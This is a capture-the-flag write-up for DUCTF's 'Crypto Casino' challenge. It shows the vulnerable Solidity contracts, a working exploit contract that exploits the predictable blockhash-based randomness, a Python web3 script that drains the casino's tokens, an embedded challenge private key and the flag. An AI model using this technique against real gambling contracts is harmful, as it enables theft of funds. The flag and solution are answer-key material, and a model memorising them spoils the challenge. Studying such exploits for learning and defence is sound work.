# Crypto Casino [25 solves] [492 points]

### Description
```
Come play at the crypto casino and use real crypto(graphy) skills to earn fake crypto(currency)

Goal: Gain a balance of 1337 DUCoin.

Author: joseph#8210
```

This challenge has a weak PRNG and we can just revert the `play()` function call with a contract if we lose the bet. 

The objective is to drain all DUCoins from the casino contract.

### Casino.sol : 
```solidity
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./DUCoin.sol";
import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol";

contract Casino is Ownable {
    DUCoin public immutable ducoin;

    bool trialed = false;
    uint256 lastPlayed = 0;
    mapping(address => uint256) public balances;

    constructor(address token) {
        ducoin = DUCoin(token);
    }

    function deposit(uint256 amount) external {
        ducoin.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "Insufficient balance!");
        ducoin.transfer(msg.sender, amount);
        balances[msg.sender] -= amount;
    }

    function _randomNumber() internal view returns(uint8) {
        uint256 ab = uint256(blockhash(block.number - 1));
        uint256 a = ab & 0xffffffff;
        uint256 b = (ab >> 32) & 0xffffffff;
        uint256 x = uint256(blockhash(block.number));
        return uint8((a * x + b) % 6);
    }

    function play(uint256 bet) external {
        require(balances[msg.sender] >= bet, "Insufficient balance!");
        require(block.number > lastPlayed, "Too fast!");
        lastPlayed = block.number;

        uint8 roll = _randomNumber();
        if(roll == 0) {
            balances[msg.sender] += bet;
        } else {
            balances[msg.sender] -= bet;
        }
    }

    function getTrialCoins() external {
        if(!trialed) {
            trialed = true;
            ducoin.transfer(msg.sender, 7);
        }
    }
}
```

### DUCoin.sol
```solidity
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/token/ERC20/ERC20.sol";
import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/access/Ownable.sol";

contract DUCoin is ERC20, Ownable {
    constructor() ERC20("DUCoin", "DUC") {}

    function freeMoney(address addr) external onlyOwner {
        _mint(addr, 1337);
    }
}
```

### How the challenge can be solved : 

After the contracts are deployed, `freeMoney()` is called and mint 1337 DUCoins to the casino contract

We can get 7 DUCoins from the casino by calling `getTrialCoins()`, as we need to deposit that to call `play()`

Then we can use a contract to call `play()`, which make it revert when `_randomNumber()` != 0, so we can avoid losing bet : 

```solidity
//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./Casino.sol";

contract Exploit {

    function _randomNumber() public view returns(uint8) {
        uint256 ab = uint256(blockhash(block.number - 1));
        uint256 a = ab & 0xffffffff;
        uint256 b = (ab >> 32) & 0xffffffff;
        uint256 x = uint256(blockhash(block.number));
        return uint8((a * x + b) % 6);
    }

    function init(address _casino) public {
        Casino(_casino).getTrialCoins();
        DUCoin(Casino(_casino).ducoin()).approve(_casino, type(uint256).max);
    }

    function deposit(address _casino, uint256 _amount) public {
        Casino(_casino).deposit(_amount);
    }

    function withdraw(address _casino, uint256 _amount) public {
        Casino(_casino).withdraw(_amount);
    }

    function exploit(address _casino, uint256 _amount) public {
        require(_randomNumber() == 0, "wait for next block");
        Casino(_casino).play(_amount);
    }

    function transfer(address _casino, uint256 _amount) public {
        DUCoin(Casino(_casino).ducoin()).transfer(msg.sender, _amount);
    }	
}
```

Then just write a script which will keep calling `exploit()` until our balance is 1337 : 

```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
import rlp

web3 = Web3(HTTPProvider('https://blockchain-cryptocasino-75a2b5de1f62feef-eth.2022.ductf.dev/'))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)


wallet = '0x0c68beB0345dF7160d4969a936AC7A3fD0e2BE68'
private_key = '0xd4b3e19e68ea6117add7f313bd1475ba65c92f347ec8037f848433364b6815ec'

coin_address = '0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8'
casino_address = '0x6189762f79de311B49a7100e373bAA97dc3F4bd0'

coin_abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"freeMoney","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]'
coin_instance = web3.eth.contract(address=coin_address, abi=coin_abi)

casino_abi = '[{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getTrialCoins","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[{"internalType":"uint256","name":"bet","type":"uint256"}],"name":"play","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"ducoin","outputs":[{"internalType":"contract DUCoin","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]'
casino_instance = web3.eth.contract(address=casino_address, abi=casino_abi)


exploit_address = '0x20652fB79bD9FE37f2E7C1E31323715E6A383846'

exploit_abi = '[{"inputs":[{"internalType":"address","name":"_casino","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"deposit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_casino","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"exploit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"foo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_casino","type":"address"}],"name":"init","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_casino","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_casino","type":"address"},{"internalType":"uint256","name":"_amount","type":"uint256"}],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"_randomNumber","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"test","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"pure","type":"function"},{"inputs":[],"name":"trialed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]'
exploit_instance = web3.eth.contract(address=exploit_address, abi=exploit_abi)


nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 100000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = exploit_instance.functions.init(casino_address).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])


nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 100000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = exploit_instance.functions.deposit(casino_address, 7).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])


def exploit(amount):
	print(f'Casino balance : {casino_instance.functions.balances(exploit_address).call()}')
	print(f'DUCoin balance : {coin_instance.functions.balanceOf(exploit_address).call()}')
	nonce = web3.eth.getTransactionCount(wallet)
	gasPrice = web3.toWei('4', 'gwei')
	gasLimit = 100000
	tx = {
	    'nonce': nonce,
	    'gas': gasLimit,
	    'gasPrice': gasPrice,
	    'from': wallet
	}
	transaction = exploit_instance.functions.exploit(casino_address, amount).buildTransaction(tx)
	signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
	tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
	transaction_hash = web3.toHex(tx_hash)
	tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
	print(tx_receipt['status'])

while(True):
	balance = casino_instance.functions.balances(exploit_address).call()
	if (balance <= 665):
		exploit(balance)
	else:
		while True:
			balance = casino_instance.functions.balances(exploit_address).call()
			if (balance != 1337):
				exploit(1337-casino_instance.functions.balances(exploit_address).call())
			else:
				break
		break

nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 100000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = exploit_instance.functions.withdraw(casino_address, 1337).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])


nonce = web3.eth.getTransactionCount(wallet)
gasPrice = web3.toWei('4', 'gwei')
gasLimit = 100000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = exploit_instance.functions.transfer(casino_address, 1337).buildTransaction(tx)
signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])


print(f'Player DUCoin balance : {coin_instance.functions.balanceOf(wallet).call()}')
```

### Flag : 

```json
{"flag":"DUCTF{sh0uldv3_us3d_a_vrf??}"}
```